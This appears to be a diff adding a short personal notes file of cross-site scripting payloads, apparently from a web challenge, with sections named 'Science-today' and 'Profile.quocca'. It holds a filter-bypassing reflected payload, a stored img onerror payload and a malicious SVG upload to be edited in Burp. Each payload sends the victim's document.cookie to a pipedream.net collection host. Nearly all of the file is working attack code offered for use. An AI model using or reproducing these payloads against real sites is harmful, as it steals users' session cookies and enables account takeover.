@@ -1,0 +1,33 @@
+
+#Science-today
+
+Query xss
+<iimgmg src='' ononerrorerror=document.location='https://enlq1pxzsek4.x.pipedream.net/'+document.cookie />
+
+
+Stored Xss
+
+<img src="a" onerror="this.src='https://enlq1pxzsek4.x.pipedream.net/'+document.cookie"/>
+
+
+
+#Profile.quocca
+
+SVG Xss payload
+in multiform data-> edit in burp
+
+=========payload-start================
+
+Content-Disposition: form-data; name="file"; filename="img.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+			document.location='https://ene5u2la8d9uv.x.pipedream.net/'+document.cookie
+   </script>
+</svg>
+
+=========payload-end================
